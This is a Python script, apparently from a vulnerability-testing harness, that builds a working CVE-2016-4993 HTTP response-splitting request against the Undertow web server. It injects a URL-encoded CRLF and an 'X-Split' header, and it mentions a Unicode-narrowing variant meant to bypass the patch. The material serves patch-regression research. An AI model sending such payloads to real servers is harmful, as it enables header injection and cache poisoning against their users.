#!/usr/bin/env python3
"""[GIVEN] CVE-2016-4993 seed exploit for undertow-jboss-wildfly-web-server-cve-2018-1067.

The classic response-splitting vector, triggered by an EXTERNAL raw-HTTP socket to the published
port of the REAL Undertow server: an attacker-influenced request value flows into a response header
value carrying a plain CRLF:

    GET /reflect?v=x%0D%0AX-Split:%20<marker> HTTP/1.1

Undertow URL-decodes the query to the header value "x\\r\\nX-Split: <marker>" and reflects it into
the X-Reflect response header. On V0 (undertow-core 1.4.2.Final, pre-CVE-2016-4993)
HttpResponseConduit.writeString writes every char raw (`buffer.put((byte) charAt(i))`), so the
"\\r\\n" hits the wire and the injected "X-Split" becomes its OWN header line -> the response splits
and the host-side raw-socket detector confirms it (REACHES). On V1 (1.4.3.Final, CVE-2016-4993
patched) writeString runs the new char-based guard `if(c != '\\r' && c != '\\n')` and neutralises
the CR/LF chars (maps them to spaces) -> the value folds onto the single X-Reflect line
(`X-Reflect: x  X-Split: ...`), no standalone X-Split header exists,
and the split is not confirmed (BLOCKED). The block on V1 is specifically the CR/LF guard the
CVE-2016-4993 fix added.

`build_request(sep_enc, marker)` is the shared raw-request framing helper; the residual reuses it
with the U+010D/U+010A narrowing separator instead of a plain CRLF.
"""
import secrets


def build_request(sep_enc: bytes, marker: bytes) -> bytes:
    """A raw `GET /reflect?v=...` HTTP/1.1 request whose reflected value is
    `x<sep>X-Split: <marker>`, where <sep> is the (URL-encoded) CRLF payload under test.
    Connection: close so the reader terminates once the response is sent."""
    q = b"x" + sep_enc + b"X-Split:%20" + marker
    return (
        b"GET /reflect?v=" + q + b" HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )


def candidate() -> dict:
    # CVE-2016-4993: a plain, URL-encoded CRLF (%0D%0A) in the reflected header value.
    marker = b"INJ" + secrets.token_hex(5).encode()
    return {
        "id": "cve-2016-4993-plain-crlf",
        "mode": "seed",
        "marker": marker.decode("latin-1") if isinstance(marker, bytes) else marker,
        "raw": build_request(b"%0D%0A", marker).decode("latin-1"),
    }


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
